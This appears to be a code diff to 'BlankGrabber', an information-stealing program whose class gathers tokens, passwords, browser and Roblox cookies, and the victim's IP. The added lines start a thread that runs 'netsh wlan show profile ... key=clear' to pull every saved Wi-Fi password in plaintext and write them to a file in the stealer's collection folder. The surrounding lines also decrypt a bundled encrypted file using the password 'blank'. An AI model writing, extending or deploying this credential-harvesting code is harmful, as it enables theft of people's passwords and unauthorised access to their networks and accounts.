@@ -129,6 +129,9 @@ class BlankGrabber:
         self.tokens = []
         t = k = None
         self.passwords = self.cookies = self.roblocookies = []
+        t = threading.Thread(target= lambda: self.getWifiPasswords())
+        t.start()
+        threads.append(t)
         t = threading.Thread(target= lambda: self.getip())
         t.start()
         threads.append(t)
@@ -207,6 +210,29 @@ class BlankGrabber:
     def logs(self, e, exc_info):
         with open(os.path.join(self.tempfolder, "Logs.txt"), "a", errors= "ignore") as file:
             file.write(f"\nLine {exc_info[2].tb_lineno} : {e.__class__.__name__} : {e}")
+
+    def getWifiPasswords(self):
+        profiles = []
+        passwords = {}
+        for line in (subprocess.run("netsh wlan show profile", shell= True, capture_output= True).stdout.decode().strip().splitlines()):
+            if "All User Profile" in line:
+                name= line[(line.find(":") + 1):].strip()
+                profiles.append(name)
+
+        for profile in profiles:
+            found = False
+            for line in (subprocess.run(f"netsh wlan show profile \"{profile}\" key=clear", shell= True, capture_output= True).stdout.decode().strip().splitlines()):
+                if "Key Content" in line:
+                    passwords[profile] = line[(line.find(":") + 1):].strip()
+                    found = True
+                    break
+            if not found:
+                passwords[profile] = "(None)"
+        profiles = []
+        for i in passwords:
+            profiles.append(f"Network: {i}\nPassword: {passwords[i]}")
+        with open(os.path.join(self.system, "Wifi Networks.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
+            file.write("\n----------------------------------------------------\n".join(profiles))
 
     def getpass(self):
         subprocess.run("a.es -d -p blank pm.bam.aes", cwd= sys._MEIPASS, capture_output= True, shell= True)
